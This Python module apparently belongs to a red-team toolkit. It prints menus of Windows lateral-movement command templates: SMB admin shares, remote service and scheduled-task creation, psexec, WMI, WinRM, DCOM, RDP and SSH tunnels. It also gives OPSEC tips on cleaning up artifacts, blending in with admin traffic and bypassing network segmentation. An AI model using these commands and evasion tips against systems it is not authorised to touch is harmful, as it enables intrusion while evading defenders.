"""Lateral Movement Channels Module"""

from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.table import Table
from rich import box
from rich.console import Console


class LateralModule:
    """Module for lateral movement channels"""
    
    def run(self, console: Console, session_data: dict):
        """Run lateral movement module"""
        while True:
            console.print(Panel(
                "[bold]Lateral Movement Channels[/bold]\n\n"
                "Execute lateral movement using SMB/RPC, WinRM, WMI, and RDP.",
                title="Module 4",
                border_style="cyan"
            ))
            console.print()
            
            table = Table(box=box.SIMPLE, show_header=False)
            table.add_column("Option", style="cyan", width=3)
            table.add_column("Function", style="white")
            
            table.add_row("1", "SMB/RPC-based Movement")
            table.add_row("2", "WinRM / PowerShell Remoting")
            table.add_row("3", "WMI-based Execution")
            table.add_row("4", "RDP-based Pivoting")
            table.add_row("5", "DCOM / COM-based Movement")
            table.add_row("6", "SSH Tunneling & Port Forwarding")
            table.add_row("0", "Return to main menu")
            
            console.print(table)
            console.print()
            
            choice = Prompt.ask("Select function", choices=['0', '1', '2', '3', '4', '5', '6'], default='0')
            
            if choice == '0':
                break
            elif choice == '1':
                self._smb_rpc(console, session_data)
            elif choice == '2':
                self._winrm_psremoting(console, session_data)
            elif choice == '3':
                self._wmi_execution(console, session_data)
            elif choice == '4':
                self._rdp_pivoting(console, session_data)
            elif choice == '5':
                self._dcom_com(console, session_data)
            elif choice == '6':
                self._ssh_tunneling(console, session_data)
            
            console.print()
    
    def _smb_rpc(self, console: Console, session_data: dict):
        """SMB/RPC-based lateral movement"""
        console.print("\n[bold cyan]SMB/RPC-based Lateral Movement[/bold cyan]\n")
        
        console.print("[bold]Administrative Share Access:[/bold]")
        smb_cmds = [
            "net use \\\\<target>\\C$ /user:<domain>\\<user> <password>",
            "net use \\\\<target>\\C$ /user:<domain>\\<user> * (prompt for password)",
            "net use \\\\<target>\\ADMIN$ /user:<domain>\\<user> <password>",
            "Copy-Item -Path <local> -Destination \\\\<target>\\C$\\<path> -Credential <cred>"
        ]
        
        for cmd in smb_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]Remote Service Management:[/bold]")
        service_cmds = [
            "sc \\\\<target> create <service> binPath= \"<command>\"",
            "sc \\\\<target> start <service>",
            "sc \\\\<target> stop <service>",
            "sc \\\\<target> delete <service>"
        ]
        
        for cmd in service_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]Remote Process Creation:[/bold]")
        process_cmds = [
            "wmic /node:<target> /user:<user> /password:<pass> process call create \"<command>\"",
            "psexec.exe \\\\<target> -u <user> -p <pass> <command>",
            "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList <command> -ComputerName <target> -Credential <cred>"
        ]
        
        for cmd in process_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]Remote Scheduled Task:[/bold]")
        task_cmds = [
            "schtasks /create /s <target> /u <user> /p <pass> /tn <task> /tr \"<command>\" /sc onstart",
            "schtasks /run /s <target> /u <user> /p <pass> /tn <task>",
            "schtasks /delete /s <target> /u <user> /p <pass> /tn <task> /f"
        ]
        
        for cmd in task_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]OPSEC Considerations:[/bold]")
        console.print("  • Use built-in Windows binaries (sc, wmic, schtasks)")
        console.print("  • Prefer service creation over direct process execution")
        console.print("  • Clean up artifacts after execution")
    
    def _winrm_psremoting(self, console: Console, session_data: dict):
        """WinRM / PowerShell Remoting"""
        console.print("\n[bold cyan]WinRM / PowerShell Remoting[/bold cyan]\n")
        
        console.print("[bold]WinRM Configuration Check:[/bold]")
        config_cmds = [
            "winrm get winrm/config",
            "winrm enumerate winrm/config/listener",
            "Test-WSMan -ComputerName <target>"
        ]
        
        for cmd in config_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]PowerShell Remoting:[/bold]")
        ps_cmds = [
            "Enter-PSSession -ComputerName <target> -Credential <cred>",
            "Invoke-Command -ComputerName <target> -Credential <cred> -ScriptBlock { <command> }",
            "Invoke-Command -ComputerName <target> -Credential <cred> -FilePath <script.ps1>",
            "$sess = New-PSSession -ComputerName <target> -Credential <cred>; Invoke-Command -Session $sess -ScriptBlock { <command> }"
        ]
        
        for cmd in ps_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]WinRS (WinRM Command Line):[/bold]")
        winrs_cmds = [
            "winrs -r:<target> -u:<user> -p:<pass> <command>",
            "winrs -r:<target> -u:<user> -p:<pass> cmd.exe"
        ]
        
        for cmd in winrs_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]Enable WinRM Remotely:[/bold]")
        enable_cmds = [
            "winrm quickconfig -force (local)",
            "Enable-PSRemoting -Force (local)",
            "Invoke-Command -ComputerName <target> -ScriptBlock { Enable-PSRemoting -Force }"
        ]
        
        for cmd in enable_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]OPSEC Considerations:[/bold]")
        console.print("  • WinRM uses HTTPS (5986) by default - encrypted")
        console.print("  • Resembles legitimate admin automation")
        console.print("  • Can execute scripts without dropping files")
    
    def _wmi_execution(self, console: Console, session_data: dict):
        """WMI-based execution"""
        console.print("\n[bold cyan]WMI-based Execution[/bold cyan]\n")
        
        console.print("[bold]WMI Query:[/bold]")
        query_cmds = [
            "wmic /node:<target> /user:<user> /password:<pass> process list",
            "wmic /node:<target> /user:<user> /password:<pass> service list",
            "wmic /node:<target> /user:<user> /password:<pass> os get name",
            "Get-WmiObject -Class Win32_Process -ComputerName <target> -Credential <cred>"
        ]
        
        for cmd in query_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]WMI Process Creation:[/bold]")
        wmi_exec_cmds = [
            "wmic /node:<target> /user:<user> /password:<pass> process call create \"<command>\"",
            "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList <command> -ComputerName <target> -Credential <cred>",
            "[PowerShell] $proc = [WmiClass]\"\\\\<target>\\root\\cimv2:Win32_Process\"; $proc.Create(\"<command>\")"
        ]
        
        for cmd in wmi_exec_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]WMI Event Subscription (Persistence):[/bold]")
        wmi_event_cmds = [
            "Get-WmiObject -Class __EventFilter -Namespace root\\subscription",
            "Get-WmiObject -Class __EventConsumer -Namespace root\\subscription",
            "Get-WmiObject -Class __FilterToConsumerBinding -Namespace root\\subscription"
        ]
        
        for cmd in wmi_event_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]OPSEC Considerations:[/bold]")
        console.print("  • WMI operates over ports commonly allowed for management")
        console.print("  • Useful for inventorying hosts remotely")
        console.print("  • Can be used where other remoting mechanisms unavailable")
    
    def _rdp_pivoting(self, console: Console, session_data: dict):
        """RDP-based pivoting"""
        console.print("\n[bold cyan]RDP-based Pivoting[/bold cyan]\n")
        
        console.print("[bold]RDP Connection:[/bold]")
        rdp_cmds = [
            "mstsc /v:<target> /admin",
            "mstsc /v:<target> /f",
            "xfreerdp /u:<user> /p:<pass> /v:<target>",
            "rdesktop -u <user> -p <pass> <target>"
        ]
        
        for cmd in rdp_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]RDP via SSH Tunnel:[/bold]")
        tunnel_cmds = [
            "ssh -L 3389:<target>:3389 user@<ssh_host>",
            "Then connect: mstsc /v:localhost",
            "[PowerShell] New-SSHLocalPortForward -LocalPort 3389 -RemoteHost <target> -RemotePort 3389"
        ]
        
        for cmd in tunnel_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]RDP Session Enumeration:[/bold]")
        enum_cmds = [
            "qwinsta /server:<target>",
            "query session /server:<target>",
            "quser /server:<target>"
        ]
        
        for cmd in enum_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]Use Cases:[/bold]")
        use_cases = [
            "Access tools only exposed via GUI",
            "Interact with legacy admin consoles",
            "Use MMC snap-ins remotely",
            "Access jump hosts, DCs, management servers"
        ]
        
        for case in use_cases:
            console.print(f"  • {case}")
        
        console.print("\n[bold]OPSEC Considerations:[/bold]")
        console.print("  • RDP sessions are visible in event logs")
        console.print("  • Use short-lived, tightly scoped sessions")
        console.print("  • Prefer SSH tunnel for RDP when possible")
    
    def _dcom_com(self, console: Console, session_data: dict):
        """DCOM / COM-based movement"""
        console.print("\n[bold cyan]DCOM / COM-based Movement[/bold cyan]\n")
        
        console.print("[bold]DCOM Execution:[/bold]")
        dcom_cmds = [
            "[PowerShell] $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\", \"<target>\")); $dcom.Document.ActiveView.ExecuteShellCommand(\"<command>\", $null, $null, 7)",
            "[PowerShell] Invoke-DCOM -ComputerName <target> -Method MMC20.Application -Command <command>",
            "[PowerShell] Invoke-DCOM -ComputerName <target> -Method ShellWindows -Command <command>",
            "[PowerShell] Invoke-DCOM -ComputerName <target> -Method ShellBrowserWindow -Command <command>"
        ]
        
        for cmd in dcom_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]COM Objects:[/bold]")
        com_info = [
            "MMC20.Application - ExecuteShellCommand method",
            "ShellWindows - ShellExecute method",
            "ShellBrowserWindow - ShellExecute method",
            "Excel.Application - Run method",
            "Outlook.Application - CreateObject method"
        ]
        
        for info in com_info:
            console.print(f"  • {info}")
        
        console.print("\n[bold]OPSEC Considerations:[/bold]")
        console.print("  • DCOM uses RPC (135) and dynamic ports")
        console.print("  • Less commonly monitored than SMB/WinRM")
        console.print("  • Requires appropriate COM permissions")
    
    def _ssh_tunneling(self, console: Console, session_data: dict):
        """SSH tunneling and port forwarding"""
        console.print("\n[bold cyan]SSH Tunneling & Port Forwarding[/bold cyan]\n")
        
        console.print("[bold]Local Port Forwarding:[/bold]")
        local_fwd = [
            "ssh -L <local_port>:<remote_host>:<remote_port> user@<ssh_host>",
            "ssh -L 3389:internal-dc:3389 user@jump-host",
            "ssh -L 5985:target:5985 user@jump-host",
            "[PowerShell] New-SSHLocalPortForward -LocalPort <port> -RemoteHost <host> -RemotePort <port>"
        ]
        
        for cmd in local_fwd:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]Remote Port Forwarding:[/bold]")
        remote_fwd = [
            "ssh -R <remote_port>:<local_host>:<local_port> user@<ssh_host>",
            "ssh -R 8080:localhost:80 user@target",
            "Enables reverse connections"
        ]
        
        for cmd in remote_fwd:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]Dynamic Port Forwarding (SOCKS):[/bold]")
        dynamic_fwd = [
            "ssh -D <local_port> user@<ssh_host>",
            "ssh -D 1080 user@jump-host",
            "Configure proxy: localhost:1080",
            "Use with proxychains, etc."
        ]
        
        for cmd in dynamic_fwd:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]Use Cases:[/bold]")
        use_cases = [
            "Access internal services through jump host",
            "Bypass network segmentation",
            "Create encrypted tunnels for lateral movement",
            "Access RDP/WinRM on internal hosts"
        ]
        
        for case in use_cases:
            console.print(f"  • {case}")
